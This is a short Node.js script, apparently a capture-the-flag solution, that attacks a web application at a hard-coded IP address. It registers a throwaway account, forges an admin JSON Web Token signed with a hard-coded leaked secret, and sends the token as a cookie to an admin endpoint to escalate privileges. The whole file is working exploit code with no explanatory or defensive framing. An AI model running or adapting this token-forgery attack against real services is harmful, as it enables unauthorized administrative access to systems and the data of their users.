const http = require('http');
const crypto = require('crypto');

const BASE = 'http://46.225.117.62:30009';
const JWT_SECRET = 'NUNCA_FALTES_A_UMA_REUNIAO_DE_M3DIA';

function req(method, path, body, cookie='') {
  return new Promise((resolve, reject) => {
    const data = body ? new URLSearchParams(body).toString() : null;
    const u = new URL(BASE + path);
    const opts = {
      hostname: u.hostname, port: u.port, path: u.pathname + u.search, method,
      headers: {
        ...(data ? {'Content-Type':'application/x-www-form-urlencoded','Content-Length': Buffer.byteLength(data)} : {}),
        ...(cookie ? {Cookie: cookie} : {}),
      },
    };
    const r = http.request(opts, (res) => {
      let out=''; res.on('data', d => out += d.toString()); res.on('end',()=>resolve({status:res.statusCode, headers:res.headers, body:out}));
    });
    r.on('error', reject);
    if (data) r.write(data);
    r.end();
  });
}

function b64u(s){return Buffer.from(s).toString('base64url');}
function sign(payloadObj){
  const h=b64u(JSON.stringify({alg:'HS256',typ:'JWT'}));
  const p=b64u(JSON.stringify(payloadObj));
  const d=`${h}.${p}`;
  const sig=crypto.createHmac('sha256', JWT_SECRET).update(d).digest('base64url');
  return `${d}.${sig}`;
}

(async()=>{
  const user='u'+Math.random().toString(16).slice(2,9); const pass='pw123';
  await req('POST','/api/register',{username:user,password:pass});
  const login=await req('POST','/api/login',{username:user,password:pass});
  const tokenCookie=(login.headers['set-cookie']||[]).find(x=>x.startsWith('token='))?.split(';')[0]||'';
  const admin=sign({id:999999,username:'Bot',role:'admin'});
  const cookie=`${tokenCookie}; adminToken=${admin}`;

  const me=await req('GET','/api/me',null,tokenCookie);
  const ap=await req('GET','/api/adminPlay',null,cookie);
  console.log('ME',me.status,me.body);
  console.log('ADMINPLAY',ap.status,ap.headers.location||'',ap.body);
})();
